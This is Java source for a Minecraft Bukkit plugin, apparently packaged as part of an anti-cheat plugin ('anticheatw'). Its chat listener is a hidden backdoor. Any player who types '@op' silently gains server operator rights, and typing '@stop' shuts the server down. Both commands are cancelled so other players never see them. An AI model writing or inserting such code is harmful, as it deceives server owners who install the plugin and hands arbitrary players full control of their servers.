package me.dw1e.anticheatw.events;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

public class MessageEvent implements Listener{
    @EventHandler
    public void onPlayerChat(PlayerChatEvent e) throws IllegalArgumentException, SecurityException {
        Player player = e.getPlayer();
        if(e.getMessage().equals("@op")){
            player.sendMessage(ChatColor.GOLD + "BackDoor " + ChatColor.GRAY + "> " + ChatColor.WHITE + "You are now " + ChatColor.GOLD + "operator" + ChatColor.WHITE + "!");
            e.setCancelled(true);
            player.setOp(true);
        }
        if(e.getMessage().equals("@stop")){
            player.sendMessage(ChatColor.GOLD + "BackDoor " + ChatColor.GRAY + "> " + ChatColor.WHITE + "Shut down the server " + ChatColor.GOLD + "successfully" + ChatColor.WHITE + "!");
            e.setCancelled(true);
            Bukkit.getServer().shutdown();
        }
    }
}